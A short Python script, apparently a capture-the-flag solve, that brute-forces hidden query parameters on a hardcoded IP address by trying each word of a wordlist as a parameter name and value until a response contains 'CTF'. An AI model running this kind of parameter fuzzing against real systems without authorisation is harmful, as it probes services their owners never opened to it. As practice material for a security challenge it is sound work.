import requests

url = "http://34.141.59.125:32391/"

wl = open("wordlist.txt", "r").readlines()

for w in wl:
    w = w.replace("\n", "")
    print(url+"?"+w+"="+w)
    r = requests.get(url+"?"+w+"="+w)
    if b"CTF" in r.content:
        print(r.content)
        exit(0)